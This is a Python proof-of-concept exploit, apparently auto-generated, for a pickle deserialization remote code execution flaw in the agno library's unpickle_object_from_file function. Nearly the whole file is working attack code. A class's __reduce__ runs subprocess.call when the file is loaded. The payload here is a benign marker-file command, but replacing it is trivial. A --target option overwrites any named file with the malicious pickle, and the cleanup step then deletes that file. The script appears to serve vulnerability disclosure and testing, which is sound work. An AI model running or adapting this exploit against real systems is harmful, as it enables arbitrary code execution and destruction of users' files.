#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: rce-010
# Sink: unpickle_object_from_file
# Auto-generated — run with: python3 rce_function_unpickle_object_uses_unpickle_object_from_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for agno library RCE via unsafe pickle deserialization.

Vulnerability: The function unpickle_object_from_file() uses pickle.load() on a file
path that is attacker-controllable. pickle.load() executes arbitrary code during
deserialization, and the verify_class check happens AFTER deserialization, so it
does not prevent RCE.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Calling the vulnerable function with the path to this malicious file
3. Verifying the command was executed

Usage:
    python3 poc_agno_rce.py [--target /path/to/victim/file]
"""

import os
import sys
import pickle
import tempfile
import argparse
import subprocess
from pathlib import Path

# Try to import the vulnerable module - adjust path as needed
try:
    # Attempt to import from the agno library
    sys.path.insert(0, '/tmp/agno/libs/agno')
    from agno.utils.pickle import unpickle_object_from_file
except ImportError:
    # If import fails, we'll demonstrate the vulnerability directly
    # by showing how pickle.load() executes code
    print("[!] Could not import agno library directly.")
    print("[*] Demonstrating vulnerability using equivalent code...")
    unpickle_object_from_file = None


class MaliciousPayload:
    """
    A class that executes arbitrary code when unpickled.
    The __reduce__ method tells pickle what to call when deserializing.
    """
    def __reduce__(self):
        # Return a tuple: (callable, args) - subprocess.call will be called
        # with the command to execute
        return (subprocess.call, (['touch', '/tmp/poc_success.txt'],))


def create_malicious_pickle(filepath: str) -> None:
    """
    Create a malicious pickle file that executes a command when deserialized.
    
    Args:
        filepath: Path where the malicious pickle file will be written
    """
    payload = MaliciousPayload()
    with open(filepath, 'wb') as f:
        pickle.dump(payload, f)
    print(f"[+] Created malicious pickle file: {filepath}")


def verify_exploit_success() -> bool:
    """
    Check if the exploit was successful by looking for the marker file.
    
    Returns:
        True if the marker file exists, False otherwise
    """
    marker = Path('/tmp/poc_success.txt')
    if marker.exists():
        print("[+] SUCCESS: Marker file /tmp/poc_success.txt was created!")
        print("[*] This confirms arbitrary code execution via pickle deserialization.")
        return True
    else:
        print("[-] Marker file not found. Exploit may have failed.")
        return False


def cleanup(malicious_file: str) -> None:
    """
    Clean up the malicious pickle file and marker file.
    
    Args:
        malicious_file: Path to the malicious pickle file to remove
    """
    try:
        if os.path.exists(malicious_file):
            os.remove(malicious_file)
            print(f"[*] Cleaned up malicious file: {malicious_file}")
        marker = Path('/tmp/poc_success.txt')
        if marker.exists():
            marker.unlink()
            print("[*] Cleaned up marker file: /tmp/poc_success.txt")
    except Exception as e:
        print(f"[!] Cleanup warning: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for agno library pickle deserialization RCE"
    )
    parser.add_argument(
        '--target',
        default=None,
        help='Path to a file to overwrite with malicious pickle (optional)'
    )
    parser.add_argument(
        '--keep-files',
        action='store_true',
        help='Do not clean up created files after demonstration'
    )
    args = parser.parse_args()

    # Create a temporary file for the malicious pickle
    with tempfile.NamedTemporaryFile(suffix='.pkl', delete=False) as tmp:
        malicious_file = tmp.name

    try:
        # Step 1: Create the malicious pickle file
        print("[*] Step 1: Creating malicious pickle file...")
        create_malicious_pickle(malicious_file)
        
        # Step 2: If we have a target path, copy the malicious pickle there
        if args.target:
            import shutil
            shutil.copy2(malicious_file, args.target)
            print(f"[*] Copied malicious pickle to target: {args.target}")
            target_path = args.target
        else:
            target_path = malicious_file
        
        # Step 3: Trigger the vulnerability
        print(f"[*] Step 2: Calling unpickle_object_from_file('{target_path}')...")
        print("[*] This will execute the malicious payload during deserialization...")
        
        if unpickle_object_from_file is not None:
            # Use the actual library function
            result = unpickle_object_from_file(Path(target_path))
            print(f"[*] Function returned: {result}")
        else:
            # Demonstrate the vulnerability directly
            print("[*] (Direct demonstration) Calling pickle.load() on the malicious file...")
            with open(target_path, 'rb') as f:
                result = pickle.load(f)
            print(f"[*] pickle.load() returned: {result}")
        
        # Step 4: Verify the exploit worked
        print("[*] Step 3: Verifying exploit success...")
        success = verify_exploit_success()
        
        if success:
            print("\n[!] VULNERABILITY CONFIRMED: Arbitrary code execution via pickle deserialization")
            print("[!] The verify_class check does NOT prevent RCE because it runs AFTER deserialization")
        else:
            print("\n[-] Exploit verification failed - check if the marker file was created elsewhere")
            
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Cleanup unless --keep-files was specified
        if not args.keep_files:
            cleanup(malicious_file)
            if args.target and args.target != malicious_file:
                try:
                    if os.path.exists(args.target):
                        os.remove(args.target)
                        print(f"[*] Cleaned up target file: {args.target}")
                except Exception as e:
                    print(f"[!] Could not clean target file: {e}")
        else:
            print(f"[*] Files preserved: malicious={malicious_file}, marker=/tmp/poc_success.txt")


if __name__ == '__main__':
    print("=" * 60)
    print("agno Library Pickle Deserialization RCE - Proof of Concept")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates CVE-like vulnerability in agno's")
    print("[*] unpickle_object_from_file() function.")
    print("[*] The function uses pickle.load() which executes arbitrary code")
    print("[*] during deserialization, before any class verification.")
    print()
    main()
    print()
    print("[*] PoC completed.")
